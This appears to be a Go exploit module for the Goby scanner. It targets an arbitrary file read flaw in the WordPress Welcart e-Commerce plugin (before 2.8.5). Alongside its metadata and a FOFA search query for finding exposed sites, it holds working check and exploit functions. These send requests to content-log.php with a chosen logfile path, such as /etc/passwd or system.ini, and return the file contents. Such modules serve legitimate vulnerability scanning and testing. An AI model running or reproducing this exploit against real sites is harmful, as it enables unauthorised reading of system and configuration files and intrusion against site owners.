package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Welcart e-Commerce content-log.php logfile File Read Vulnerability",
    "Description": "<p>Welcart is a free e-commerce plugin for WordPress with top market share in Japan.An arbitrary file read vulnerability exists in Welcart e-Commerce &lt; 2.8.5, and attackers can exploit this vulnerability to obtain sensitive files.</p>",
    "Product": "WordPress-Welcart-e-Commerce",
    "Homepage": "https://wordpress.org/plugins/usc-e-shop",
    "DisclosureDate": "2022-12-05",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/usc-e-shop\"",
    "GobyQuery": "body=\"wp-content/plugins/usc-e-shop\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>1、Set up access policies through firewalls and other security devices, and set up whitelist access.</p><p>2、If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://wpscan.com/vulnerability/0d649a7e-3334-48f7-abca-fff0856e12c7"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "loaderurl|lastbody|regex|['|\"]loaderurl['|\"]\\s*:\\s*['|\"]http[s]://.*\\.[a-z]{2,}(.*/wp-content).*?['|\"]"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{loaderurl}}}/plugins/usc-e-shop/functions/content-log.php?logfile={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Welcart e-Commerce 插件 content-log.php 文件 logfile 参数文件读取漏洞",
            "Product": "WordPress-Welcart-e-Commerce",
            "Description": "<p>Welcart 是一个免费的 WordPress 电子商务插件，在日本市场占有率最高。Welcart e-Commerce 2.8.5版本存在任意文件读取漏洞，攻击者利用该漏洞可获取敏感文件。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Welcart e-Commerce content-log.php logfile File Read Vulnerability",
            "Product": "WordPress-Welcart-e-Commerce",
            "Description": "<p>Welcart is a free e-commerce plugin for WordPress with top market share in Japan.An arbitrary file read vulnerability exists in Welcart e-Commerce &lt; 2.8.5, and attackers can exploit this vulnerability to obtain sensitive files.<br></p>",
            "Recommendation": "<p>1、Set up access policies through firewalls and other security devices, and set up whitelist access.</p><p>2、If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			cfg_vuln := httpclient.NewGetRequestConfig("/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=content-log.php")
			cfg_vuln.VerifyTls = false
			cfg_vuln.FollowRedirect = false
			if response_vuln, err := httpclient.DoHttpRequest(u, cfg_vuln); err == nil {
				return response_vuln.StatusCode == 200 && strings.Contains(response_vuln.RawBody, "rawurldecode") && strings.Contains(response_vuln.RawBody, "file_get_contents")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			cfg_vuln := httpclient.NewGetRequestConfig(fmt.Sprintf("/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%s", filePath))
			cfg_vuln.VerifyTls = false
			cfg_vuln.FollowRedirect = false
			if response_vuln, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_vuln); err == nil {
				expResult.Success = true
				expResult.Output = response_vuln.RawBody
			}
			return expResult
		},
	))
}
